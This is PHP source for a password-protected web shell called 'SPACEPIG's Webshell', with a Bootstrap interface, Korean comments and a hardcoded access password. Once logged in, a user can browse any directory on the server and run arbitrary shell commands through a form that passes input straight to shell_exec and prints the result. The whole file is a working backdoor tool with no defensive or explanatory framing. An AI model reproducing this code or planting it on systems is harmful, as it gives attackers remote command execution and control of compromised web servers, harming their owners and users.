<?
session_start();
header("Content-Type: text/html; charset=UTF-8");
$mode = $_REQUEST["mode"];
$path = $_REQUEST["path"];
$page = basename($_SERVER["PHP_SELF"]);
$inputPW = $_POST["inputPw"];
$AccessPW = "jorkdhnghks6352"; ##!access password!##

$accessFlag = $_SESSION["accessFlag"];

if($accessFlag == "Y") {
    if(empty($path)){
        $tempFileName = basename(__FILE__);
        $tempPath = realpath(__FILE__);
        $path = str_replace($tempFileName, "", $tempPath);
        $path = str_replace("\\", "/", $path);
    } else {
        $path = realpath($path)."/";
        $path = str_replace("\\", "/", $path);
    }
    # Dir list retuurn function
    function getDirList($getPath) {
        $listArr = array();
        $handler = opendir($getPath);
        while($file = readdir($handler)) {
            if(is_dir($getPath.$file) == "1") {
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }

    #File List return function
    function getFileList($getPath) {
        $listArr = array();
        $handler = opendir($getPath);

        while($file = readdir($handler)) {
            if(is_dir($getPath.$file) != "1") {
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }
    

} if ($mode == "login" && ($AccessPW == $inputPW)) {
        $_SESSION["accessFlag"] = "Y";
        echo "<script>location.href= '{$page}'</script>";
        exit();
    }
?>
<!DOCTYPE html>
<link href="C:\Users\niuri\OneDrive\바탕 화면\htmls\Hacker-Bootstrap-Template-master\css\hacker.css" rel="stylesheet">
<html lang="ko">
<head>
    <title>SPACEPIG's Webshell</title>
    <!-- 합쳐지고 최소화된 최신 CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <!-- 부가적인 테마 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <!-- 합쳐지고 최소화된 최신 자바스크립트 -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
</head>
<body background-color="black">
<div class="container-fluid">
    <div class="row">
    <div class="col-md-3"></div>
    <div class="col-md-6">
    <? if ($accessFlag != "Y") { ?>
        <?if (! $inputPW != $AccessPW){ ?>
            <script type="text/javascript">
            alert("WrongPassWord");
            </script>
        <? } ?>
        <h3>Login at SPACEPIG's Webshell 1.0.1 BETA</h3>
        <img src="https://www.weblife.fr/wp-content/uploads/2012/07/anonymous-logo-768x749.png" alt="PASSWORD" class="img-rounded"
        style="width:200px; height:200px">
        <hr>
        <form action="<?=$page?>?mode=login" method="POST">

        <div cLass="input-group">
        <span class="input-group-addon">PassWord</span>
        <input type="password" class="form-control" pLacehoLder="Password Input..." name="inputPw">
        </div>
        <br>
        <p cLass="text-center"><button class="btn btn-default" type="submit">Auth</button></a>
        </form>

    <? } else { ?>
    <h3>Webshell ver.0.0.1.Beta <small>Created by Spacepig</small></h3>
    <hr>
    <ul class="nav nav-tabs">
    <li role="presentation" <?if(empty($mode) || $mode == "fileBrowser") echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
    <li role="presentation" <?if($mode == "command") echo "class=\"active\"";?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
    </ul>
    <br>
    <?if(empty($mode) || $mode == "fileBrowser") { ?>
    <form action="<?=$page?>?mode=fileBrowser" metho="GET">
        <div class="input-group">
        <span class="input-group-addon">Current Path</span>
        <input type="text" class="form-control" placeholder="Path Input..." name="path" value="<?=$path?>">
        <span class="input-group-btn">
        <button class="btn btn-default" type="submit">Move</button>
        </span>
        </div>
    </form>
    <hr>
    <div class="table-responsive">
    <table class="table table-bordered table-hover" style="table-layout: fixed; word-break: break-all;">
        <thead>
            <tr class="active">
                <th style="width: 50%"class="text-center">Name</th>
                <th style="width: 20%" class="text-center">Type</th>
                <th style="width: 30%" class="text-center">Date</th>
            </tr>
        </thead>
        <tbody>
            <?
            $dirList = getDirList($path);
            for($i=0; $i<count($dirList); $i++) {
                if($dirList[$i] != ".") {
                $dirDate = date("Y-m-d H:i", filemtime($path.$dirList[$i]));
            ?>
            <tr>
                <td style="vertical-align : middle" class="text-primary"><b><span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span>&nbsp;&nbsp;<a href="<?=$page?>?mode=fileBrowser&path=<?=$path?><?=$dirList[$i]?>"><?=$dirList[$i]?></a></td>
                <td style="vertical-align : middle" class="text-center"><kbd>Directory</kbd></td>
                <td style="vertical-align : middle" class="text-center"><?=$dirDate?></td>
                <td style="vertical-align : middle" class="text-center">
                <? if($dirList[$i] != "..") { ?>
                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                </div>
                <? } ?>
                </td>
            </tr>
            <? 
                }
            ?>
    <? } ?>
    <?
            $fileList = getFileList($path);
            for($i=0; $i<count($fileList); $i++) {
                $fileDate = date("Y-m-d H:i", filemtime($path.$fileList[$i]));
            ?>
            <tr>
                <td style="vertical-align : middle"><span class="glyphicon glyphicon-file" aria-hidden="true"></span> <?=$fileList[$i]?></td>
                <td style="vertical-align : middle" class="text-center"><kbd>File</kbd></td>
                <td style="vertical-align : middle" class="text-center"><?=$fileDate?></td>
                <td style="vertical-align : middle" class="text-center">
                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                </div>
                </td>
            </tr>
            <? } ?>

        </tbody>  
</table>
</div>
<? } else if(empty($mode) || $mode == "command") { ?>
<form action="<?=$page?>?mode=command" method="POST">
    <div class="input-group">
    <span cLass="input-group-addon">Command</span>
    <input type="text" cLass="-form-control" pLacehoLder="Command Input..." name="command" value="<?=$command?>">
    <span cLass="input-group-btn">
    </span>
    </div>
    <br>
    <div class="btn-group btn-center" role="group" aria-label="...">
        <p class="text-center"><button cLass="btn btn-default" type="submit">Execution</button></a>
</div>
</form>
    <? 
    if(!empty($_POST["command"])) {
        echo "<hr>";
        $result = shell_exec($_POST["command"]);
        $result = str_replace("\n", "<br>", $result);
        $result = iconv("CP949", "UTF-8", $result);
        echo "𝙍𝙀𝙎𝙐𝙇𝙏", "<br>", $result;
    }
    ?>
<? } ?>
<? } ?>
    <hr>
    <p class="text-muted text-center">Copyright© 2022, Spacepig, All rights reserved.</p>
    </div>
    <div class="col-md-3"></div>
    </div>

</div>
</body>
</html>